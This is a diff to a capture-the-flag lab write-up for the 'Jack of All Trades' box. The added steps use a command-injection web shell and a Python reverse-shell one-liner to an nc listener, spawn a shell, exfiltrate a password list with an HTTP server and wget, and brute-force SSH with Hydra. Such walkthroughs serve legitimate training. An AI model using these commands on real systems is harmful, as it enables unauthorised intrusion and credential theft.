@@ -68,9 +68,36 @@
 
 ``http://10.10.252.248:22/nnxhweOV/index.php?cmd=whoami``
 
++ **It's all working, so go grab a reverse shell. I'm gonna use python and start listen with nc**
 
+``nc -lvnp 1234``
 
+``http://10.10.252.248:22/nnxhweOV/index.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'``
 
+![12](images/access.jpg?raw=true "access")
+
+**Here we got our access into the system. Let's spawn an interactive shell with python and continue to enumerate**
+
+``python -c 'import pty; pty.spawn("/bin/bash")'``
+
++ **Looking into the /home directory, we can see a** ``jacks_password_list`` **file which seems to be a password list for the jake user. According to the second service opened, on the 80 port, the ssh service, we're gonna try to bruteforce the login with the given wordlist and with the help of the Hydra tool**
+
+![13](images/jackspassw.jpg?raw=true "jacks")
+
++ **Firstly, we need to download the** ``jacks_password_list`` **file to our machine. Open a python server on the Jack box and we're gonna get the file on our's**
+
+**The Jack box**
+``www-data@jack-of-all-trades:/home$ python -m SimpleHTTPServer 6999``
+**Our machine**
+``{kali@kali:Jack of All Trades_0}$ wget 10.10.252.248:6999/jacks_password_list``
+
++ **Now, having the wordlist, let's start the bruteforce phase. Don't forget to set the port for the ssh service, because it's not on the default (22), but the 80 one**
+
+``hydra -s 80 -v -V -l jack -P jacks_password_list -t 8 10.10.252.248  ssh``
+
+![13](images/hydra(1).jpg?raw=true "hydra")
+
+**Let's connect into the ssv server with our credentials**
 
 
 
